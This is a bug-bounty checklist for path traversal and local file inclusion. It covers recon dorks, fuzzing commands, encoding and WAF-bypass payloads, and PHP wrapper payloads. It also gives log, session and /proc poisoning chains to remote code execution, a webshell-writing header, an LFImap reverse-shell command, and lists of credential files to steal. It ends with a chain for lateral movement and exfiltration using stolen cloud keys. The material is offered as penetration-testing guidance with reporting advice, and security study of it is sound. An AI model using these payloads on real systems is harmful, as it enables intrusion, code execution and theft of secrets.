# Path Traversal / LFI — Bug Bounty Hunting Checklist

> **Severity mindset:** Path Traversal (read-only) → Medium. LFI (execution) → High. Reading `.env` / creds → High. LFI → RCE → Critical. Always push toward the escalation chain.

---

## Concept Distinctions

| Type                            | What It Does                                                   | Severity    |
| ------------------------------- | -------------------------------------------------------------- | ----------- |
| **Path Traversal**              | Navigate `../` to read arbitrary files                         | Medium      |
| **LFD** (Local File Disclosure) | Read sensitive non-executable files                            | Medium–High |
| **LFI** (Local File Inclusion)  | Server includes AND executes local file                        | High        |
| **RFI** (Remote File Inclusion) | Server includes external URL (requires `allow_url_include=On`) | Critical    |

---

## Phase 1 — Recon & Discovery

### 1.1 Google Dorks (passive, zero interaction)
```
site:target.com inurl:file=
site:target.com inurl:page=
site:target.com inurl:include=
site:target.com inurl:path=
site:target.com inurl:download=
site:target.com inurl:doc=
site:target.com inurl:filename=
site:target.com inurl:load=
site:target.com inurl:read=
site:target.com inurl:src=
site:target.com ext:php inurl:file
site:target.com ext:php inurl:page=
inurl:"?page=" site:target.com
inurl:"?file=" site:target.com
inurl:"?include=" site:target.com
```

### 1.2 Historical URL Harvesting
```bash
# Collect all historical URLs
echo "target.com" | gau > urls.txt
echo "target.com" | waybackurls >> urls.txt
echo "target.com" | katana >> urls.txt
cat urls.txt | uro | sort -u > urls_clean.txt

# Filter for LFI-prone parameter names
cat urls_clean.txt | gf lfi > lfi_candidates.txt
```

### 1.3 Parameter Discovery with ffuf
```bash
# Step 1: Find what parameters the endpoint accepts
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'https://target.com/index.php?FUZZ=value' \
  -fs 2287 -mc 200

# Step 2: Once param found — fuzz payloads against it
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'https://target.com/index.php?page=FUZZ' \
  -fs 2287 -mc 200

# Step 3: Identify webroot (needed for base-path required bypasses)
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'https://target.com/index.php?page=../../../../FUZZ/index.php' \
  -fs 2287

# Step 4: Precise Linux file scan
ffuf -w ~/wordlists/LFI-WordList-Linux:FUZZ \
  -u 'https://target.com/index.php?page=../../../../FUZZ' \
  -fs 2287
```

### 1.4 High-Value Endpoints — Check These Manually
- [ ] `/download?file=` or `/download?filename=`
- [ ] `/image?filename=` or `/img?src=`
- [ ] `/view-log?path=` or `/logs?file=`
- [ ] `/preview?template=` or `/render?layout=`
- [ ] `/api/export?name=` or `/api/fetch?resource=`
- [ ] `/include?page=` or `/load?module=`
- [ ] File upload — test traversal sequences **in the filename itself**
- [ ] Java apps — always try `WEB-INF/web.xml`
- [ ] JSON POST bodies — look for `filename`, `templatePath`, `resource`, `path` keys
- [ ] GraphQL — `readFile(path: "...")` or `download(name: "...")`

---

## Phase 2 — Automated Scanning

### 2.1 Quick gau + qsreplace Confirmation
```bash
# Test all candidates against /etc/passwd in one shot
cat lfi_candidates.txt | qsreplace "/etc/passwd" \
  | xargs -I@ curl -s @ \
  | grep "root:x:" \
  && echo "[+] HIT"

# With traversal prefix
cat lfi_candidates.txt | qsreplace "../../../../etc/passwd" \
  | xargs -I@ curl -s @ \
  | grep "root:x:"
```

### 2.2 Nuclei Templates
```bash
# Official LFI/traversal templates
nuclei -l lfi_candidates.txt \
  -t http/vulnerabilities/ \
  -tags lfi,traversal \
  -o nuclei_hits.txt

# Fuzzing templates (broader coverage)
nuclei -l lfi_candidates.txt \
  -t fuzzing/ \
  -tags lfi \
  -o nuclei_fuzz.txt
```

### 2.3 wfuzz
```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  --hc 404 \
  "https://target.com/index.php?page=FUZZ"
```

### 2.4 dotdotpwn (classic traversal fuzzer)
```bash
# HTTP module
perl dotdotpwn.pl -m http -h target.com -f /etc/passwd -t 300 -q -b

# URL mode with known parameter
perl dotdotpwn.pl -m http-url \
  -h target.com \
  -u "https://target.com/page.php?file=TRAVERSAL" \
  -f /etc/passwd
```

### 2.5 LFImap (full exploitation)
```bash
# Discovery mode
python3 lfimap.py -U "https://target.com/page.php?file=test" -a

# Exploitation mode (reverse shell)
python3 lfimap.py -U "https://target.com/page.php?file=test" \
  -x --lhost 10.0.0.1 --lport 443
```

---

## Phase 3 — Manual Testing & Bypass Techniques

### 3.1 Baseline Test
```
GET /image?filename=../../../etc/passwd
GET /download?file=../../../etc/passwd
```
**Confirm** with: `root:x:0:0:root:/root:/bin/bash` in response.

### 3.2 Absolute Path (when `../` is stripped)
```
/etc/passwd
/etc/hosts
etc/passwd
```

### 3.3 Nested Traversal (non-recursive strip bypass)
```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..///////..////..//////etc/passwd
```

### 3.4 URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
..%2fetc%2fpasswd
```

### 3.5 Double URL Encoding (WAF bypass)
```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%252f..%252f..%252fetc%252fpasswd
```

### 3.6 UTF-8 / Overlong Encoding
```
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd
```

### 3.7 Null Byte Injection (PHP < 5.3.4)
```
../../../etc/passwd%00
../../../etc/passwd%00.png
../../../etc/passwd%00.php
```

### 3.8 Base-Path Required Bypass
```
/var/www/images/../../../etc/passwd
/var/www/html/../../../etc/passwd
/home/user/files/../../../etc/passwd
```
> Use when the app validates the path starts with a specific directory.

### 3.9 Windows Targets
```
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\inetpub\wwwroot\web.config
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
\\localhost\c$\windows\win.ini
\\UNC\share\name
```

### 3.10 Nginx `..;/` Trick
```
/admin/..;/secret
/api/v1/..;/admin/users
```
> Nginx treats `..;/` as a directory separator; Tomcat/Spring interpret it as `/../`.

### 3.11 Spring / Java `%3B` Semicolon Bypass
```
/resources/..%3B/
/static/..%3B/WEB-INF/web.xml
```

### 3.12 ASP.NET Cookieless Session Bypass
```
/(S(X))/admin/..%2f..%2fetc/passwd
/(XXXXXXXX)/path/to/file
```

### 3.13 Mangled Paths (WAF evasion)
```
..././..././..././etc/passwd
...\\.\\...\\.\\etc\\passwd
.////.////etc////passwd
```

### 3.14 POST Body Traversal
```bash
# Many testers miss POST — always check JSON and form data
curl -s -X POST https://target.com/api/export \
  -H 'Content-Type: application/json' \
  -d '{"filename": "../../../etc/passwd"}'

curl -s -X POST https://target.com/api/export \
  -H 'Content-Type: application/json' \
  -d '{"filename": "../../../../.env"}'
```

### 3.15 File Upload Filename Traversal
```bash
# Inject traversal into multipart filename
curl -X POST https://target.com/fileupload \
  -F "file=@test.txt;filename=../../../etc/passwd"

# Or using HTTP filename override
curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=../../../var/www/html/shell.php"
```

---

## Phase 4 — LFI Escalation: PHP Wrappers

> Apply these when the server is PHP and you can confirm file inclusion (not just traversal read).

### 4.1 Read PHP Source Code (base64)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
```
Decode output: `echo '<BASE64_OUTPUT>' | base64 -d`

### 4.2 Execute PHP via POST Body
```bash
# Set LFI parameter to php://input, send PHP in POST body
curl -s "https://target.com/page.php?file=php://input" \
  --data '<?php system("id"); ?>'

curl -s "https://target.com/page.php?file=php://input" \
  --data '<?php system($_GET["cmd"]); ?>&cmd=id'
```

### 4.3 Inline Base64 Execution
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
(Decodes to: `<?php system($_GET['cmd']); ?>`)
```
https://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

### 4.4 expect:// (requires expect extension)
```
https://target.com/page.php?file=expect://id
https://target.com/page.php?file=expect://whoami
```

### 4.5 zip:// (after file upload)
```bash
# 1. Create a zip containing a PHP shell
zip shell.zip shell.php
# 2. Upload it
# 3. Include via zip wrapper
https://target.com/page.php?file=zip:///uploads/shell.zip%23shell.php
```

### 4.6 phar:// (PHP phar archive)
```
https://target.com/page.php?file=phar:///uploads/img.jpg/shell.php
```

---

## Phase 5 — LFI → RCE Escalation Paths

### 5.1 Apache / Nginx Log Poisoning
```bash
# Step 1: Confirm log file is readable
curl -s "https://target.com/page.php?file=../../../../var/log/apache2/access.log" | head -20
curl -s "https://target.com/page.php?file=../../../../var/log/nginx/access.log" | head -20

# Step 2: Poison the log with PHP in User-Agent
curl -s "https://target.com/" \
  -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Step 3: Trigger RCE via LFI
curl -s "https://target.com/page.php?file=../../../../var/log/nginx/access.log&cmd=id"
curl -s "https://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami"
```

**Log file paths to try:**
```
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/nginx/access.log
/var/log/httpd/access_log
/proc/self/fd/2           ← stderr (often points to error log)
```

### 5.2 SSH Auth Log Poisoning (/var/log/auth.log)
```bash
# Step 1: Confirm auth log is readable
curl -s "https://target.com/page.php?file=../../../../var/log/auth.log"

# Step 2: SSH with PHP code as username (it gets logged)
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Step 3: Trigger via LFI
curl -s "https://target.com/page.php?file=../../../../var/log/auth.log&cmd=id"
```

### 5.3 /proc/self/environ
```bash
# Step 1: Confirm readable
curl -s "https://target.com/page.php?file=../../../../proc/self/environ"

# Step 2: Poison via User-Agent
curl -s "https://target.com/" \
  -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Step 3: Trigger
curl -s "https://target.com/page.php?file=../../../../proc/self/environ&cmd=id"
```

### 5.4 /proc/self/fd/* (open file descriptors)
```bash
# Brute-force open file descriptors (often points to logs/temp files)
for i in $(seq 0 30); do
  result=$(curl -s "https://target.com/page.php?file=../../../../proc/self/fd/$i&cmd=id")
  echo "fd/$i: $result" | grep -v "^fd"
done
```

### 5.5 PHP Session File Poisoning
```bash
# Step 1: Find the session ID (from your cookie)
PHPSESSID="your_session_id_here"

# Step 2: Inject PHP into a session variable
curl -s "https://target.com/page.php?page=<?php system(\$_GET['cmd']); ?>" \
  -H "Cookie: PHPSESSID=$PHPSESSID"

# Step 3: Include your session file
curl -s "https://target.com/page.php?file=../../../../tmp/sess_$PHPSESSID&cmd=id"
# Also try: /var/lib/php/sessions/sess_$PHPSESSID
```

### 5.6 File Write via /proc (write webshell without direct upload)
```bash
# Base64-encode a PHP webshell, inject via User-Agent to write a file
SHELL_B64=$(echo '<?php echo shell_exec($_GET["cmd"]); ?>' | base64 -w 0)

curl -s "https://target.com/" \
  -H "User-Agent: <?php \$a=base64_decode('$SHELL_B64');\$f=fopen('/var/www/html/x.php','w');fwrite(\$f,\$a);fclose(\$f); ?>"

# Trigger the write via LFI
curl -s "https://target.com/page.php?file=../../../../proc/self/environ"

# Access your new webshell
curl -s "https://target.com/x.php?cmd=id"
```

### 5.7 Upload + Include Chain
```bash
# 1. Upload a file containing PHP (disguised as image)
curl -s -X POST https://target.com/upload \
  -F "file=@shell.jpg"   # shell.jpg contains: <?php system($_GET['cmd']); ?>

# 2. Note the upload path from response
# 3. Include via LFI
curl -s "https://target.com/page.php?file=../../../../uploads/shell.jpg&cmd=id"
```

---

## Phase 6 — Sensitive Files to Target

### 6.1 Linux — Priority Order for Bug Bounty Impact
```
# Highest impact (secrets/credentials)
/proc/self/environ              ← API keys, DB creds, debug tokens
/var/www/html/.env              ← Database URL, API keys, secrets
/var/www/html/config.php        ← DB credentials
/var/www/html/wp-config.php     ← WordPress DB + secret keys
/root/.aws/credentials          ← AWS access keys
/root/.docker/config.json       ← Docker registry creds
/home/<user>/.ssh/id_rsa        ← SSH private key
/etc/shadow                     ← Password hashes (root needed)

# Proof-of-concept files
/etc/passwd                     ← Standard PoC — always try first
/etc/hosts
/etc/resolv.conf

# Log files (for poisoning)
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/vsftpd.log

# Config files (tech stack intel + creds)
/etc/ssh/sshd_config
/etc/mysql/my.cnf
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/crontab

# Browser history / shell history
/home/<user>/.bash_history
/root/.bash_history

# Runtime data
/proc/self/cmdline
/proc/self/status
/proc/version
/proc/net/tcp
/tmp/sess_<session_id>          ← PHP sessions
```

### 6.2 Cloud-Specific (highest impact in 2025)
```
/var/task/                      ← AWS Lambda source code
/var/task/.env                  ← Lambda environment secrets
/home/site/wwwroot/             ← Azure App Service root
/var/secrets/                   ← Generic secrets mount
/.dockerenv                     ← Confirm running in Docker
/proc/1/environ                 ← Container environment (secrets)
/var/run/secrets/kubernetes.io/serviceaccount/token  ← K8s SA token
```

### 6.3 Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\php\php.ini
C:\xampp\apache\logs\access.log
```

### 6.4 Java / Spring Specific
```
WEB-INF/web.xml               ← App config, endpoint list, auth rules
WEB-INF/applicationContext.xml
WEB-INF/spring/root-context.xml
META-INF/MANIFEST.MF
```

### 6.5 Infrastructure / DevOps Files
```
.git/config
.env
docker-compose.yml
terraform.tfvars
.kube/config
composer.lock
package-lock.json
```

---

## Phase 7 — Chaining for Impact

### 7.1 Traversal → Creds → Admin Panel → RCE ($40k Real Chain)
```
Step 1: Find /download?filename= endpoint
Step 2: Read WEB-INF/web.xml → discover hidden endpoints
Step 3: Read application log files → find stored admin credentials
Step 4: Authenticate to admin panel with found creds
Step 5: Find scripting console (Groovy, JSP shell, admin tools)
Step 6: Execute arbitrary code → RCE
```

### 7.2 Traversal → .env → Lateral Movement
```
Step 1: Read /var/www/html/.env or /proc/self/environ
Step 2: Extract DB_PASSWORD, API_KEY, AWS_SECRET_ACCESS_KEY
Step 3: Use AWS keys → s3 ls, ec2 describe → data exfil
Step 4: Use DB creds → dump tables → user data → ATO
```

### 7.3 Traversal → SSRF Chain
```
Step 1: Confirm file read exists
Step 2: Try /proc/net/tcp → identify internal services
Step 3: Read /etc/hosts → find internal hostnames
Step 4: Chain to SSRF endpoint to hit internal IPs
```

### 7.4 File Upload Filename → Traversal → LFI (Critical)
```
Step 1: Find unauthenticated or authenticated upload endpoint
Step 2: curl -X POST /upload -F "file=@test.txt;filename=../../../etc/passwd"
Step 3: CDN or download URL leaks file contents → arbitrary file read
Step 4: Upload PHP shell → include via traversal → RCE
```

### 7.5 LFI → Log Poison → RCE (Full Chain)
```
Step 1: Confirm LFI with /etc/passwd
Step 2: Confirm log file is readable (access.log / auth.log)
Step 3: Poison log with PHP in User-Agent
Step 4: Trigger via LFI + ?cmd=id → RCE
Step 5: Escalate: reverse shell, webshell write, cred dump
```

---

## Phase 8 — Response Validation

```bash
# Confirm file read (Linux)
curl -s "https://target.com/page.php?file=../../../etc/passwd" | grep "root:x:"

# Confirm file read (Windows)
curl -s "https://target.com/page.php?file=..\..\..\windows\win.ini" | grep -i "\[extensions\]"

# Confirm LFI execution (PHP wrapper)
curl -s "https://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php" \
  | base64 -d | head -20

# Confirm RCE via log poisoning
curl -s "https://target.com/page.php?file=../../../../var/log/nginx/access.log&cmd=id" \
  | grep "uid="
```

---

## Phase 9 — Reporting

### Severity Matrix
| Finding | Severity |
|---|---|
| Read `/etc/passwd` only | Low–Medium |
| Read app config + tech stack intel | Medium |
| Read `.env` with DB creds / API keys | High |
| Read SSH private key | High |
| Read AWS/cloud credentials | High–Critical |
| LFI (code execution confirmed) | High |
| LFI → RCE (log poisoning, wrappers) | Critical |
| Unauthenticated path traversal → any sensitive file | +1 severity bump |

### PoC Checklist Before Submitting
- [ ] `curl` output showing file contents (e.g., `/etc/passwd` first few lines)
- [ ] If cloud/creds: show what the credential grants access to (don't actually exploit further)
- [ ] If LFI: confirm with `php://filter` base64 output decoded
- [ ] If RCE: show `id` or `whoami` output only — don't go further
- [ ] Document the full parameter and endpoint
- [ ] Rate the impact beyond just "file read" — what can an attacker do with this file?

### Minimal PoC Template
```
Vulnerable endpoint:
GET /image?filename=../../../../etc/passwd

PoC:
curl -s "https://target.com/image?filename=../../../../etc/passwd"

Response excerpt:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

Impact:
Unauthenticated arbitrary file read allows an attacker to access
sensitive server files. Reading /proc/self/environ or application
configuration files may expose credentials enabling full account
or infrastructure takeover.
```

---

## Parameter Name Master List
```
file, filename, filepath, path, page, include, doc, document,
folder, root, pg, style, pdf, template, php_path, prefix,
module, section, layout, action, load, read, download, open,
dir, show, log, name, resource, config, data, source, view,
content, lang, mod, content, redirect, src, ref, href, uri,
location, url (in some frameworks)
```

---

## Tool Stack Reference
| Tool | Purpose | Install |
|---|---|---|
| `ffuf` | Parameter + payload fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| `wfuzz` | LFI payload fuzzing | `pip3 install wfuzz` |
| `gau` | Historical URL harvesting | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| `gf` | LFI pattern filter | `go install github.com/tomnomnom/gf@latest` + 1ndianl33t patterns |
| `qsreplace` | Bulk payload injection | `go install github.com/tomnomnom/qsreplace@latest` |
| `nuclei` | Template scanning | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| `LFImap` | LFI discovery + exploitation | `git clone https://github.com/hansmach1ne/LFImap` |
| `dotdotpwn` | Classic traversal fuzzer | `git clone https://github.com/wireghoul/dotdotpwn` |
| `psychoPATH` | Advanced payload generator | `git clone https://github.com/ewilded/psychoPATH` |
| `dirsearch` | Endpoint discovery | `git clone https://github.com/maurosoria/dirsearch` |

## Key Wordlists (SecLists)
```
Fuzzing/LFI/LFI-Jhaddix.txt                          ← primary LFI list
Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
Discovery/Web-Content/burp-parameter-names.txt         ← parameter fuzzing
Discovery/Web-Content/default-web-root-directory-linux.txt
Discovery/Web-Content/default-web-root-directory-windows.txt
```

---

## References
- PayloadsAllTheThings File Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
- PayloadsAllTheThings Directory Traversal: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- SecLists LFI wordlists: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
- PortSwigger Path Traversal Theory: https://portswigger.net/web-security/file-path-traversal
- HackTricks File Inclusion: https://book.hacktricks.xyz/pentesting-web/file-inclusion
- LFImap: https://github.com/hansmach1ne/LFImap
- Full article references: [[1-Refreces/ARTICLES/ATTACK/PATH-TRAVERSAL]]
